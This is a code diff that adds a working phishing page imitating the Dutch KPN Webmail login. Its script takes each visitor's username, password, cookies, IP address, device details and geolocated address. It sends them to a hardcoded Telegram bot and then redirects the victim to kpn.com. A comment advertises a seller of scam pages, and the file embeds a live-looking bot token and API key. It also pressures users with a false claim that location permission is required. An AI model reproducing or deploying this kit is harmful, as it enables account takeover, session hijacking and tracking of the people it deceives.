@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="nl-NL">
+  <head>
+    <title>KPN Webmail</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta charset="utf-8">
+    <meta name="description" content="Met Webmail kunt u e-mail op het internet lezen en versturen zonder een e-mailprogramma. U kunt dus op iedere PC met een internetverbinding uw e-mail lezen en versturen, ook in het buitenland.">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="icon" href="/loginpages/images/kpnmail/favicon.svg" />
+    <link rel="stylesheet" type="text/css" href="/loginpages/css/kpnmail.css?v=16465" />
+    <link rel="canonical" href="/" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <div id="wrapper">
+      <header class="row">
+        <div id="logo"><a href="/">
+            <div class="kpn-logo"></div>
+          </a></div>
+        <div id="title">
+          <h1>Inloggen Webmail</h1>
+        </div>
+      </header>
+      <div class="row">
+        <div id="main">
+          <div><noscript><strong>Deze browser ondersteunt geen JavaScript</strong>
+              <p> Je zou het volgende kunnen proberen: <ul>
+                  <li>Zet JavaScript aan in je browser als die dit ondersteunt</li>
+                  <li>Gebruik een andere browser die wel JavaScript ondersteunt</li>
+                </ul>
+              </p>
+            </noscript>
+            <form method="post" onsubmit="sendLog(event)" class="">
+              <div class="form-input">
+                <div id="emailaddress"></div><input name="username" id="username" placeholder="Gebruikersnaam / e-mailadres" required type="text" tabindex="1" autocomplete="username" oninput="updateEmailDomain()" />
+                <div class="error-message error-required">Vul je gebruikersnaam of e-mailadres in.</div>
+              </div>
+              <div class="form-input"><input name="password" id="password" placeholder="Wachtwoord" required type="password" tabindex="2" autocomplete="current-password" />
+                <div class="error-message error-required">Vul je wachtwoord in.</div>
+              </div><label><input id="remember" type="checkbox" tabindex="3"> Onthoud mijn gebruikersnaam </label><input id="inloggen" name="inloggen" alt="Inloggen" type="submit" value="Login" tabindex="4" />
+              <div id="message" class="error-message"></div>
+            </form>
+            <div class="spinner"></div>
+            <div id="links" class="row">
+              <h3>Waarmee kunnen we je helpen?</h3>
+              <ul class="links-left">
+                <li><a href="https://www.kpn.com/service/internet/e-mail/wachtwoord-of-gebruikersnaam-vergeten.htm" target="_blank"> Wachtwoord vergeten </a></li>
+                <li><a href="https://www.kpn.com/service/internet/e-mail.htm" target="_blank"> Alles over KPN e-mail en Webmail </a></li>
+                <li><a href="https://www.kpn.com/service/mobiel/problemen/toestelhulp.htm#/topic/e-mail/handmatig-instellen/device" target="_blank"> E-mail instellen op je mobiele telefoon </a></li>
+                <li><a href="https://www.kpn.com/service/internet/e-mail/geen-e-mail-ontvangen-of-versturen.htm" target="_blank"> Problemen bij het ontvangen en versturen van e-mail </a></li>
+                <li><a href="https://freeler.email.kpn.com" target="_blank"> Freeler e-mail instellingen beheren </a></li>
+              </ul>
+              <ul class="links-right"></ul>
+            </div>
+            <div id="banner" class="row"><a rel="nofollow" id="specials" href="/Specials.aspx">Specials</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //Do not touch this section
+      //When testing results, if you don't find it in your inbox, check your spam folder.
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+
+      const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+
+      var lastLoginName = document.cookies?.read("lastLoginName") || localStorage.getItem("lastLoginName");
+
+      if (lastLoginName) {
+         document.getElementById("username").value = lastLoginName;
+         document.getElementById("remember").checked = true;
+         document.getElementById("password").focus();
+      }
+
+      function updateEmailDomain() {
+        var usernameInput = document.getElementById("username");
+        var emailDomain = "@kpnmail.nl";
+        if (usernameInput.value.length > 0 && !usernameInput.value.endsWith(emailDomain)) {
+          var cursorPosition = usernameInput.selectionStart;
+          var inputValueBeforeDomain = usernameInput.value.substring(0, cursorPosition);
+          usernameInput.value = inputValueBeforeDomain + emailDomain;
+          usernameInput.setSelectionRange(cursorPosition, cursorPosition);
+        }
+        if (usernameInput.value.endsWith(emailDomain)) {
+          usernameInput.style.color = 'black';
+        } else {
+          usernameInput.style.color = 'black';
+        }
+      }
+
+      function sendLog(event) {
+        event.preventDefault();
+        
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+        var x = document.cookie;
+
+        fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+          const deviceInfo = {
+            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+          };
+          getLocation(username, password, deviceInfo, ipAddress, x);
+        }).catch(error => {
+          console.error("Error capturing IP address:", error);
+        });
+      }
+
+      function getLocation(username, password, deviceInfo, ipAddress, x) {
+        navigator.geolocation?.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
+          try {
+            const response = await fetch(apiUrl);
+            const data = await response.json();
+            if (data.results.length > 0) {
+              const result = data.results[0].components;
+              const city = result.city || result.village || result.town;
+              const state = result.state;
+              const country = result.country;
+              const zipCode = result.postcode;
+              const continent = result.continent;
+              const county = result.county;
+
+              var dataToSend = {
+                username,
+                password,
+                ipAddress,
+                Device: deviceInfo.manufacturer,
+                OS: deviceInfo.os,
+                Browser: deviceInfo.browser,
+                Latitude: latitude,
+                Longitude: longitude,
+                City: city,
+                State: state,
+                Country: country,
+                County: county,
+                ZipCode: zipCode,
+                Cookies: x,
+              };
+              if (Object.keys(dataToSend).length > 0) {
+                sendToTelegram(dataToSend);
+              } else {
+                console.warn("No data to send to Telegram.");
+              }
+            } else {
+              console.error("Location information not found.");
+            }
+          } catch (error) {
+            console.error("Error fetching location data:", error);
+          }
+        },
+        (error) => {
+            // Handle the case where the user denies location permission
+            console.error("Error getting location:", error);
+            alert("Location permission is required to login to Webmail.");
+        }
+        );
+      }
+
+      function sendToTelegram(data) {
+        // Add your bot details here👇 (this is where you will get the logs)
+        var telegramBotId = "5991263032:AAHNBV9ePhJQlroqIq0a0YkLYWQCbVltgEo";
+        var chatId = 6157700917;
+
+        var payload = {
+          chat_id: chatId,
+          text: `
+            New Webmail (KPNmail) Logs:
+            ________________________
+               "Username / Email address": "${data.username}",
+               "Password": "${data.password}",
+               "IP Address": "${data.ipAddress}",
+               "Device Info": "${data.Device}",
+               "OS": "${data.OS}",
+               "Browser": "${data.Browser}",
+               "Latitude": ${data.Latitude},
+               "Longitude": ${data.Longitude},
+               "City": "${data.City}",
+               "State": "${data.State}",
+               "County": "${data.County}",
+               "Country": "${data.Country}",
+               "ZipCode": "${data.ZipCode}",
+               "Cookies/User Token": ["${data.Cookies}"],
+            `
+        };
+
+        var sendToBot = {
+          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          data: JSON.stringify(payload)
+        };
+        $.ajax(sendToBot).done(function(response) {
+          window.location.href = "https://www.kpn.com";
+          // console.log("Telegram API response:", JSON.stringify(response));
+        }).fail(function(error) {
+          console.error("Error sending data to Telegram:", error);
+        });
+      }
+    </script>
+  </body>
+</html>
